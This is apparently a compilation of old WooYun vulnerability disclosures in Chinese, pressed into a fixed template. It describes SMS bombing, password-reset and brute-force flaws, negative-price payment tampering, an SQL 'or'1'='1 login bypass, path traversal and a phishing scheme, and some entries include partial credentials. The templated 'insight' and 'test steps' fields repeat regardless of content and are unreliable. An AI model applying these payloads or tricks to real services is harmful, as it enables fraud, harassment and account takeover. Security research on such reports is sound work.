**厂商**: 某安全厂商 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、漏洞类型发送验证码页面未限制发送次数导致短信轰炸2、涉及漏洞的产品名称、产品组件和相关软件版本、文件版本360软件开放平台网站https://example.com/[已脱敏] “m=手机号”至https://example.com/[已脱敏] /getvcode.php HTTP/1.1Host: open.soft.360.cnProxy-Connection: keep-aliveContent-Length: 13Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963

**POC**: 返回1发送成功。

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2012-012966] 某互联网公司功能设计缺陷导致网络钓鱼利用
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，在某互联网公司摇一摇里弄个美女头像2，不停摇一摇，然后就会有人加3，如果有人加你，他的账号就会暴露给你，收集账号4，收集足够多的账号后，再把头像给换成官方的头像，名称改成官方的名称5，通过别人的加好友请求，发中奖信息钓鱼网站：weixi08.com

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 摇一摇不显示账号或者添加验证时效
---

---
### [wooyun-2015-0151857] 陕西通汇某系统设计逻辑缺陷泄露企业敏感信息
**厂商**: 陕西通汇汽车物流有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 陕西通汇汽车物流有限公司邮箱用户弱口令泄露企业敏感信息

**POC**: **.**.**.**/弱口令用户如下挑一个进去吧，看看有啥，往来邮件好多企业信息哦

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2012-010966] 某电商平台恶意申诉漏洞，利用规则成功N起案件
**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 后台管理

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台恶意申诉规则绕过，充值平台业务逻辑漏洞严重，自动充值平台后台显示交易成功，等于充值平台确认了，成功了居然还有申请退款的功能。某电商平台平台间机制缺失导致商户经济损失严重，大量商户放弃某电商平台，甚至用同样手法去行骗。

**POC**: 条件说明：卖家：1、某电商平台承诺：7*24小时 在线货源平台自动充值。自动充值系统完全自动处理订单，无须客服24小时在线，充值管理成本低。 优质丰富货源产品价格实惠、产品分布广泛、充值即时到帐、时间管理更有效。 安全保障供货商严格审核通过，卖家账户安全有可靠、稳定的保障。 轻松开店某电商平台充值平台拥有专门的服务团队，为卖买双方提供及时有效的解答和服务。 产品排名更优势卖家拥有平台的专属标识、产品方便买家搜索和充值 无缝对接平台产品可一键直接发布在某电商平台，保留某电商平台功能、让卖家效率更高2、经过测试秒冲到账无问题。买家【诈骗人员】：购买QB充值卡8张，连续4次购买。分别为444.44元。购买后立刻进行连续申诉

**绕过**: 过滤绕过

**修复**: 严格修改机制。平台需要打通关键点。
---

---
### [wooyun-2013-029076] 傲世堂一处无限短信轰炸
**厂商**: 傲世堂 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一次提交的没过？那些原因我硬是没找出一个符合的再详细的说明一次吧，再不过请审核员给出具体原因：1.先登录，选择手机绑定（没登录后边的get请求是无效的）2.填写手机号，发送验证码，并同时抓包3.可以看到图中post包中无任何验证，只有一个手机号，replay几次这个包：4.同时手机短信：。。。这样就形成了无限短信轰炸，经测试无次数限制和IP限制。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加验证。
---

---
### [wooyun-2015-0139596] 99分期密码设计逻辑缺陷可重置用户密码
**厂商**: 北京鼎力创世科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 验证码4位，存在爆破风险走起登录验证13333333333 111111

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强验证
---

---
### [wooyun-2015-0112497] 某法律咨询网站存在逻辑缺陷可泄露用户隐私(有账号证明)
**厂商**: 110法律咨询 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]	wangang	******	200	false	false	10209002	lei_only	******	200	false	false	1020

**POC**: 在m.110.com设计不当，接口没限制，没加验证码，导致爆破返回四位数就正确。这里用csdn的库，由于csdn是技术圈的，和法律圈不搭边，所以没中那么多。，。。23	wangang	*****	200	false	false	10209002	lei_only	******	200	false	false	1020

**绕过**: 直接利用

**修复**: 加验证码
---

---
### [wooyun-2015-0158461] 国家种畜禽生产经营许可证管理系统设计逻辑缺陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页：http://**.**.**.**/login.asp先上图。如下图：这是我国某部委的系统可爆破：信息：可修改：为国家做贡献。给20rank吧，我不嫌少。

**POC**: 为国家做贡献。给20rank吧，我不嫌少。

**绕过**: 直接利用

**修复**: 加验证码，防止爆破，登陆次数限制。和手机或者邮箱绑定，动态密码发送。
---

---
### [wooyun-2012-09175] 某手机系统漏洞可能导致硬件资源消耗
**厂商**: 某手机厂商 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒。利用这个漏洞，可以导致系统电源迅速消耗。（以及在大半夜把用户吓一跳）

**POC**: 漏洞利用代码片段：Intent intent = new Intent();intent.setAction("net.cactii.flash2.TOGGLE_FLASHLIGHT");sendBroadcast(intent);

**绕过**: 直接利用

**修复**: 三种方法任选一个：1. 在AndroidManifest.xml中，将TorchService申明为export="false"的；2. 在AndroidManifest.xml中，申明一个私有权限，级别为signature，并为TorchService申明需要这个权限；3. 在TorchServi
---

---
### [wooyun-2014-080120] 某通用系统万能密码漏洞
**厂商**: 亿禾工场 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 亿禾工场 https://example.com/[已脱敏]'or'1'='1嘉兴市实验小学创办于1905年，迄今已有一百多年的历史。嘉兴市实验小学是一所省一流的现代化、示范化学校。学校现有东、西两校区。嘉兴市实验小学https://example.com/[已脱敏] 身份证 监护人电话都有监护人姓名 单位 银行帐号简直就是黑产必备咦 还同步了校讯通就选这个ZZX看看 登录成功跳转校讯通看看不错不错是可以登录的在看看别家用亿禾工场的系统的后台会不会也是万能密码海宁市紫薇小学https://example.com/[已脱敏]

**POC**: 亿禾工场 https://example.com/[已脱敏]'or'1'='1嘉兴市实验小学创办于1905年，迄今已有一百多年的历史。嘉兴市实验小学是一所省一流的现代化、示范化学校。学校现有东、西两校区。嘉兴市实验小学https://example.com/[已脱敏] 身份证 监护人电话都有监护人姓名 单位 银行帐号简直就是黑产必备咦 还同步了校讯通就选这个ZZX看看 登录成功跳转校讯通看看不错不错是可以登录的在看看别家用亿禾工场的系统的后台会不会也是万能密码海宁市紫薇小学https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-0142572] 华鑫信托某重要站点存在逻辑漏洞可登陆任意账号泄漏用户合同信息和个人资料等(已成功登陆13888888888)
**厂商**: 华鑫信托 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在 华鑫信托 的APP端打开APP 点击忘记密码 然后输入手机号13888888888获取验证码  抓包发现 验证码直接返回POST /CRM/MobileServlet HTTP/1.1Host: **.**.**.**Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 284Accept-Language: zh-cnAccept: */*Connection: keep-aliveUser-Agent: TrustMobileProject/2.4.8 CFNetwork/711.4.6 Darwin/14.0.0{"security":{"id":"","appversion":"2.4.5","session":"","devicemode

**POC**: 泄漏了大量用户敏感信息可以充值任意用户的密码 然后查看他的敏感信息

**绕过**: 直接利用

**修复**: 修改逻辑
---

---
### [wooyun-2015-0143037] 前瞻网某处逻辑缺陷导致任意密码重置
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先注册两个用户，用于测试http://**.**.**.**/account/regstep1找回密码，填写测试的test1账户http://**.**.**.**/account/findpwd?from=http://**.**.**.**/看看重置密码的连接http://**.**.**.**/account/resetpwd?email=2602462006@**.**.**.**&gid=5b754e490080cc4b&from=http://**.**.**.**/把邮箱改为测试用的adm1n的邮箱一回车，重置密码的邮箱发生了变化直接修改成功

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0153035] 英威腾某系统设计逻辑缺陷导致敏感信息泄露
**厂商**: 英威腾电气股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/抓取post信息跑常见人名+123456密码成功登陆邮件系统，获取全部联系人

**POC**: http://**.**.**.**/抓取post信息跑常见人名+123456密码成功登陆邮件系统，获取全部联系人

**绕过**: 直接利用

**修复**: 验证、限制次数
---

---
### [wooyun-2014-083907] 360隐私保险箱程序锁绕过
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 360隐私保险箱程序锁，加密相册后，打开相册，应该输入密码，否则看不到里面的照片。但是，在文件管理处，找到相册的文件夹，可以看到，相册的缩略图，虽然看不到清晰的图片，但是可以通过某互联网公司的图片发送方式，来转发到另外一个某互联网公司小号，来观看高清的图片。在打开那张缩略图的时候，会让用户选择打开方式，有一个相册打开，一个通过某互联网公司打开，入股用户通过相册打开，会输入密码，但是如果用户选择通过某互联网公司打开的时候，是打开的某互联网公司图片发送功能，就不用输入密码，且会自动发送原高清图片。演示视频：https://example.com/[已脱敏] 只得外链，请谅解！

**POC**: 证明视频：https://example.com/[已脱敏] 只得外链，请谅解！

**绕过**: 直接利用

**修复**: 这个真心不会
---

---
### [wooyun-2013-026814] 某电商平台某功能可能导致短信轰炸
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题发生在域https://example.com/[已脱敏] 发送短信给用户于是用burp抓包看一下设置邮箱 进行遍历返回超过6000字节的为成功了 小跑了一下成功了不少某电商平台还是很不错的 手机看不到验证码3次过期

**POC**: 看看短信把如果被恶意利用还是挺吓人的！

**绕过**: 直接利用

**修复**: 限制一下把！
---

---
### [wooyun-2013-047381] LBE手机安全大师主动防御功能缺陷
**厂商**: lbesec.com | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 事件起源于这个漏洞，原来我一直用的软件居然是纸老虎，伤心。WooYun: 某手机厂商商城安卓客户端存储跨站&强制发短信然后猜测可能是自己手机是双卡未采用标准api来发送短信，等官方发布等版本吧LBE安全大师5.1.5446更新日志更新日期: 2013年,12月 20号下载【新增】首款支持隐私空间NFC解锁的安全软件【新增】适配双卡机型：三星I959、I9502、N9002、I929、P709 某通信厂商A199、HTC802w嗯哼，新版发布了袄支持我的手机啦，再次试了下，居然还是只能提示不能拦截。

**POC**: 写个小程序测试下吧。0x00api：15||17phone：i959  android4.2.2LBE:5.1.54460x01分别使用：标准api、调用短信activity、非标准api、webview代码执行四个方式来发送短信。部分代码如下：public void smsSend(View arg0) {/*	PendingIntent pi = PendingIntent.getActivity(MainActivity.this, 0,new Intent(), 0);*/SmsManager sms = SmsManager.getDefault();sms.sendTextMess

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2014-088355] 某IM软件某匿名活动疑似可泄漏对方某互联网公司号码（通话留痕）
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机某互联网公司新增假面狂欢夜，我等屌丝岂能错过偶遇白富美的机会，果断抄起手机开始语音。。半天没遇到个妹子，唉，苦逼了。。躺下来歇会，我尼玛，这都是大叔哪行啊，猥琐流走起，掀起我的大板砖电脑进行抓包不错，开始语音，随机匹配陌生人，据官方说是“神秘夜话，语音通话不留痕”以下是抓包结果：里边有uin字段，既是匹配陌生人的某互联网公司号啦，所谓的假面狂欢夜，其实并不是找不到的。。只可惜这两个都是汉子啊，不信？有图为证啊，本人亲自做了验证这大哥不诚实，说是点了两下，得持续一个多小时。。。好不容易碰到个妹子，没聊就给我挂了，找到她的某互联网公司我尼玛，某互联网公司验证消息，你爱谁？我尼玛哪知道，难不成是隔壁老王？不对呀，算了，放弃了。。22万多人，我就不信没有妹子，我得赶紧进被窝语音了，哈哈哈，找我的白富美妹子去。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2015-0153698] 莎啦啦鲜花网某处存在严重逻辑漏洞可以刷钱
**厂商**: 莎啦啦鲜花网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先生成负价格的订单  然后取消订单   余额会增加

**POC**: 首先生成负价格的订单  然后取消订单   余额会增加

**绕过**: 直接利用

**修复**: 求邀请码
---

---
### [wooyun-2015-0158597] 中航工业某系统设计逻辑缺陷导致泄露公司各股东及员工信息
**厂商**: 中国航空工业集团公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: dongm@**.**.**.**  / dongmmail.**.**.**.**

**POC**: dongm@**.**.**.**  / dongmmail.**.**.**.**

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0136598] 郑州某云超市平台一篮子漏洞提交
**厂商**: 郑州郑商折扣电子商务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简单来说问题有那么几个，1，支付的逻辑漏洞，任意金额支付。2，积分购物时，用户的积分数值由前台计算，可修改。3，再低级一点的，能负数支付啊，我买完东西钱包里还多了几块钱啊啊啊！任意金额支付：主页随便找一个商品，点击购买，抓包，，这里原价是2.38，改为2.39，然后下一步下一步，支付成功，ok。2，无限积分购物偶然发现还有个积分购物功能，寻思着看看怎么样呢，然后发现点击立即兑换的时候，根本没有网络请求，直接提示我积分不足，难道是在页面上取的值？重新加载页面，在页面里找到一个值，myjifen，还中英文一起。唉。现在是0，该成5000吧，完了就很神奇的可以兑换了。完了我的积分还成了-3000。3，负数支付，跟1一样，把商品价钱改为负数，选择钱包付款，这样钱包就能多出来好多钱了。如果选择某电商平台付款的话会提示失败。

**POC**: 还有很多漏洞啊，比如说上面有的商家是需要付运费的，这个运费金额也是写在页面上的，可以抓返回包，修改那个运费金额（同样可以负数），支付，也没有问题。登陆的时候也没有验证码，对密码输入错误次数也没有限制，可以爆破，并且登陆的密码是明文传输的。

**绕过**: 直接利用

**修复**: 虽然是小公司，但是钱可是实打实的人民币啊，这么问题技术上应该都没有难题吧，做程序的太不负责而已
---

---
### [wooyun-2015-0101952] 楚楚街app不仅包邮还可以0元支付
**厂商**: 楚楚街 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 选择一件商品，点击购买，用burp抓包，修改“buy_num":"-100

**POC**: 支付的时候是0元哦，等待发货ing

**绕过**: 直接利用

**修复**: “buy_num"的正负应该判断吧～
---

---
### [wooyun-2014-078367] Wireshark 2 Preview 数组内存越界访问
**厂商**: Wireshark | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 崩溃情况以及崩溃栈：(14b4.1dd8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.*** ERROR: Symbol file could not be found.  Defaulted to export symbols for F:\Program Files\Wireshark\Qt5Core.dll -*** WARNING: Unable to verify checksum for qtshark.exe*** ERROR: Module load completed but symbols could

**POC**: 截获窗口中按住Ctrl 选择 n列，会导致程序向后越界读取到n * 8字节的数据。

**绕过**: 直接利用

**修复**: 检查选择列的数量和可使用的内存的大小的值
---

---
### [wooyun-2015-0153832] 西安公路客运某系统设计逻辑缺陷漏洞
**厂商**: 西安公路客运 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 支付金额可以通过url修改http://**.**.**.**:807/TicketBook/TicketPaySend.aspx?lb_bookNo=942562&lb_Date=2015-11-14%E3%80%8007%3a30&lb_OwnerStation=%E5%9F%8E%E8%A5%BF%E5%AE%A2%E8%BF%90%E7%AB%99&lb_ArriveName=%E9%BA%9F%E6%B8%B8&lb_TicketPrice=38.50&lb_sumPrice=11.5000&lb_StFee=3.0000&lb_Optime=2015-11-13+11%3a39%3a49&lb_sumPageNum=1&lb_BaoXianTypeName=%E4%B9%98%E8%BD%A6%E6%84%8F%E5%A4%96%E9%99%A9&lb_BaoXianCompN

**POC**: http://**.**.**.**:807/TicketBook/TicketPaySend.aspx?lb_bookNo=942562&lb_Date=2015-11-14%E3%80%8007%3a30&lb_OwnerStation=%E5%9F%8E%E8%A5%BF%E5%AE%A2%E8%BF%90%E7%AB%99&lb_ArriveName=%E9%BA%9F%E6%B8%B8&lb_TicketPrice=38.50&lb_sumPrice=11.5000&lb_StFee=3.0000&lb_Optime=2015-11-13+11%3a39%3a49&lb_sumPag

**绕过**: 直接利用

**修复**: 添加后台校验
---

---
### [wooyun-2012-06226] cnvd证书查询验证码逻辑缺陷
**厂商**: cnvd | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 验证码应该是一次性的,验证一次后,无论成功与否,都应该立即销毁那个会话中的验证码数据.否则同一个验证码多次使用.加验证码就没意义了.

**POC**: 1. 打开 https://example.com/[已脱敏] 输入证书号和验证码3. 提交,看到证书.4. 点浏览器的后退按钮5. 无需改验证码,输入另一个证书号6. 提交,看到证书.此过程用程序实现也很容易,只要不请求验证码图片,输入的验证码就不用变.配合ocr或人肉辅助可以很轻松的实现自动或半自动的批量查询.

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-065217] lbe可绕过手机防盗接听电话
**厂商**: lbesec.com | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机被防盗锁定之后，正常情况下是，来电会振铃，但由于手机被防盗界面覆盖，所以无法接听。但是，插上耳机之后，通过耳机的线控，可以接听电话。

**POC**: 设置手机防盗手机接收到短信后被锁定，解锁界面覆盖整个屏幕。通知栏无法下拉，同时屏蔽了所有按键的反馈。在通知栏上可以看到来电图标，但无法接听或拒接。插入耳机后，通过操作线控，可以接听电话。未接图标消失。解开防盗锁后，可以看到，正在进行通话。

**绕过**: 直接利用

**修复**: 过滤按键反馈，包括耳机等外设的。
---

---
### [wooyun-2014-075051] dedecms 全版本设计缺陷导致验证码绕过（可用于爆破等）
**厂商**: Dedecms | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 根据dedecms源码 查到dedecms将session保存到文件中！//Session保存路径$sessSavePath = DEDEDATA."/sessions/";if(is_writeable($sessSavePath) && is_readable($sessSavePath)){session_save_path($sessSavePath);}看文件文件名就有预感 这不就是sess_+PHPSESSID 么？嘿嘿!我先访问下后台 产生验证码！然后根据cookie中的PHPSESSID访问session文件果断什么验证码识别都是渣渣

**POC**: 验证码识别都是渣渣

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2015-098244] 摇钱树网吧管理软件+连锁网吧版均存在任意文件遍历下载漏洞
**厂商**: 摇钱树网吧管理软件 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从官网下载最新版本（摇钱树网吧管理软件大小：113M 版本：2014(920)发布日期：2014-11-12）和（摇钱树网吧管理软件 连锁网吧版 大小：121M 版本：2014(920) 发布日期：2014-11-22）发现均存在开放7111 web端口，该端口由barwebserv.exe程序提供服务。由于barwebserv.exe没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。https://example.com/[已脱敏])还有各大软件下载站均提供下载，可见推广花了不少钱。。[华军][未来软件园][霏凡][统一下载][某网站][绿茶软件园][系统之家][软件天堂]https://example.com/[已脱敏]

**POC**: http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 联系厂商
---

---
### [wooyun-2011-01354] 某互联网公司2010正式版SP2.1(1861)个人资料生日BUG
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改个人资料生日时，选择生日，生肖会差一位。比如选择1986年生肖会显示牛，应该是虎生肖。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 建议官方修复
---

---
### [wooyun-2015-0114502] 海云天无纸化考试系统助我"作弊"
**厂商**: 深圳市海云天科技股份有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个页面，esc alt+f4 任务管理器，统统调不出来！可通过第三方软件作弊！猜想应该是软件禁止了快捷键，才调不出来！利用第三方输入法。成功作弊！登录窗口，切换输入法!试试调我的电脑出来，浏览器输入c:回车，成功进入！下面是厂商的介绍也许有人会说如果没有输入框不就弹不出了？我也是这样认为的，但是事实就是他可以出来。下面是交完卷子之后的界面，没有任何输入框。也是不可能通过快捷键退出客户端的！首先切切换输入法，估计她切到了sg输入法是，随便输入几个字母。就会出来sg的框。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-098554] 某互联网公司堂游戏可在房间内让指定人掉线
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞已经编制成程序并发布在各大某互联网公司堂社区，点击按钮即可让对方客户端直接关闭，性质十分恶劣，不少玩家都受到影响。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更新游戏机制，取消仲裁设定。
---

---
### [wooyun-2015-0122463] 欣欣旅游逻辑漏洞可暴力刷积分换礼品
**厂商**: cncn.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太暴力了！以后去卖门票了 别拦我

**POC**: 点击积分兑换！看看喜欢什么礼物，别拦我 我准备去卖票把 ap_num=1  改成ap_num=-10000  让网站倒贴10000份的积分给我们OK积分800万了

**绕过**: 直接利用

**修复**: 你懂的  礼物有木有呀？
---

---
### [wooyun-2012-011191] 一键绕过某互联网公司追踪的方法
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司不久前已经面向某互联网公司手机令牌用户抢先推出了查询登录信息的功能，但是菲菲多次测试发现只要简单一键即可成功绕过安全中心的登录追踪记录。看来某互联网公司还有待进一步优化啊！~有时候就是这样防不胜防！在某互联网公司安全中心登录信息查询服务中，基本上可以看到你最近一周内所有的登录类型和地点，不管是无线终端（手机某互联网公司、3G某互联网公司）还是电脑端的登陆情况都可以查出来。但是恰恰有一个地方系统却不会留下任何记录。到底是嘛呢？那就是iPad简版空间的登录入口，地址是： https://example.com/[已脱敏] 。当然直接使用我们普通的电脑也可以直接访问的。从这个入口登录你的某互联网公司帐号就不会在安全中心留下任何“蛛丝马迹”了！邮箱绕过追踪的地址是：https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 某互联网公司你懂得~
---

---
### [wooyun-2015-0108134] 同程旅游网某处支付漏洞
**厂商**: 某旅游公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1：缺陷urlhttps://example.com/[已脱敏]

